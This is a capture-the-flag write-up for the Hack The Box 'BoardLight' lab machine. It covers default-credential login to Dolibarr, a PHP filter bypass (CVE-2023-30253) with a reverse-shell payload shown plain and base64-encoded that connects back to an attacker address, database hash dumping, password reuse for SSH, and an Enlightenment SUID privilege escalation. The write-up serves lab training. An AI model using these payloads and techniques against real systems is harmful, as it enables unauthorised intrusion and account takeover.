---
tags:
  - HTB
  - Linux
  - CVE-2022-37706
  - CVE-2023-30253
  - enlightenment
  - dolibarr

icon: simple/gnometerminal
---


# BoardLight

!!! info "Box details"  
    https://app.hackthebox.com/machines/BoardLight  
    **Difficulty:** Easy  
    **OS:** Linux

> ippsec video: [youtube.com](https://www.youtube.com/watch?v=SM6OhymnMbg)  
> 0xdf blog: [0xdf.gitlab.io](https://0xdf.gitlab.io/2024/09/28/htb-boardlight.html)


## Enumeration

Nmap shows ports 22 and 80 open. In port 80 we find a web portal without much functionality. Sometimes in HTB boxes when you navigate to the ip, it redirects you to the domain name, which makes you have to add it to your /etc/hosts file. In this case, that didn't happen. But some of the content at the box of the web page shows that the domain is board.htb. We add this to our /etc/hosts file, and now we can do subdomain enumeration:

```
ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /usr/share/wordlist/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 14987

# output: crm.board.htb
```

We add the new discovered subdomain to our /etc/hosts, and navigating there shows us an instance of Dolibarr 17.0.0 running (Dolibarr is an enterprise resource planning (ERP) and customer relationship management (CRM) software package). Checking our default credentials cheatsheet (https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/refs/heads/main/DefaultCreds-Cheat-Sheet.csv) we can see two different versions of default creds for this service:
- admin:admin  
- admin:changeme  

Trying the first one gives us the following error: "Security token has expired, so action has been canceled. Please try again." This is not an auth error, so we just try again and we're in. Once in, we're greeted with another error: "Access denied. You try to access to a page, area or feature of a disabled module or without being in an authenticated session or that is not allowed to your user." But it seems like we're logged in as admin. 

Looking at cvedetails for version 17.0.0 we find there are lots of different RCE CVEs. Let's list them all so I don't get stuck in just one, I can look for the easiest one to leverage.  
- CVE-2026-23500  
- CVE-2026-22666  
- CVE-2025-67486  
- CVE-2024-37821  
- CVE-2023-38887  
- CVE-2023-38886  
- CVE-2023-30253 <- public exploit  
- CVE-2023-4197  


## Foothold

For CVE-2023-30253, what's happening is when filtering php code on created websites, the filter is case sensitive. So if instead of <?php ... ?> we use <?PHP ... ?> it will let us do it. Normally I would upload a web shell to test things out, but the clean up script on this box is super aggressive, so my new website is deleted super quickly. So let's try to directly get a reverse shell with the following payload:

```
# the first > in this payload breaks the php tag
<?PHP system("bash -c 'bash -i >& /dev/tcp/10.10.14.67/9001 0>&1'"); ?>

# so let's b64 encode it
<?PHP system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42Ny85MDAxIDA+JjE= | base64 -d | bash"); ?>
```

The second payload doesn't break, but also doesn't get executed. That's because we're accessing the wrong endpoint. If we visit http://crm.board.htb/public/website/index.php?website=a&pageref=a then our payload triggers and we get a shell.

## Privilege Escalation

In the conf files, we find credentials for mysql (dolibarrowner:serverfun2$2023!!). Using that, we can dump the database to look for creds:

```
select login,pass_crypted from llx_user;
+----------+--------------------------------------------------------------+
| login    | pass_crypted                                                 |
+----------+--------------------------------------------------------------+
| dolibarr | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |
| admin    | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)
```

We already know admin's password because that's what we used to access the admin dashboard. Trying to crack dolibarr yields nothing (used hashcat in -m 3200 for bcrypt). However, we can use the database password and test it for re-use. Listing /home (or doing `grep sh$ /etc/passwd`) shows us the other user in this box is larissa. If we try ssh'ing into the box as larissa using password serverfun2$2023!! gets us in!

## Root

One of the first enumeration steps I did was to look for suid binaries with this command:

```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

In the output we can see four binaries from the enlightenment desktop manager (which I completely missed the first time because I'm a dumdum). While these are not present in GTFOBins, we can search online for priv esc based on these binaries and we find this source: https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh

We get root shell and capture the flag. As 0xdf points out in his blog post, one thing that should've made us suspicious that this box had a desktop manager is that when we listed /home/larissa we saw things like Desktop, Downloads, Documents, etc. which are typically not there.
